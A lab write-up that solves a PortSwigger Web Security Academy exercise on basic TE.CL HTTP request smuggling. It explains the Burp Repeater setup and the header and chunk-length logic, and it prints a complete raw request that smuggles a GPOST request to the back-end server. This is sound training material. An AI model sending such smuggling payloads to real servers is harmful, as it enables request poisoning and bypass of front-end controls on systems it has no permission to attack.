
# HTTP request smuggling, basic TE.CL vulnerability

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

Note: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling



![img](images/HTTP%20request%20smuggling,%20basic%20TE.CL%20vulnerability/1.png)

---------------------------------------------

Intercept a request to “/”, change the method to POST, update the Repeater options so the Content-Length is not updated automatically and the protocol to HTTP/1:



![img](images/HTTP%20request%20smuggling,%20basic%20TE.CL%20vulnerability/2.png)


If we add a payload to add only 1 character, the “0” character gets added to the next request as well:



![img](images/HTTP%20request%20smuggling,%20basic%20TE.CL%20vulnerability/3.png)


The final payload needs:
- *Transfer-Encoding: chunked* for the frontend
- *Content-Length: 4* for the backend: It will take until the “26” characters
- *26* is the size in HEXADECIMAL for the following payload. Calculated as the length of each line + 2 for each new line character ("\\n").
- *GPOST / HTTP/1.1* to execute the GPOST request
- *Content-Length: 10* Because the backend is what understands
- *0* to end the second chunk
- 2 spaces after the “0” character

```
POST / HTTP/1.1
Host: 0a0c00cf030aaea982b5514b00a0005c.web-security-academy.net
Cookie: session=irWl3kQHO1irsOGobgJR43XvMwB3OAAk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

26
GPOST / HTTP/1.1
Content-Length: 10

0


```



![img](images/HTTP%20request%20smuggling,%20basic%20TE.CL%20vulnerability/4.png)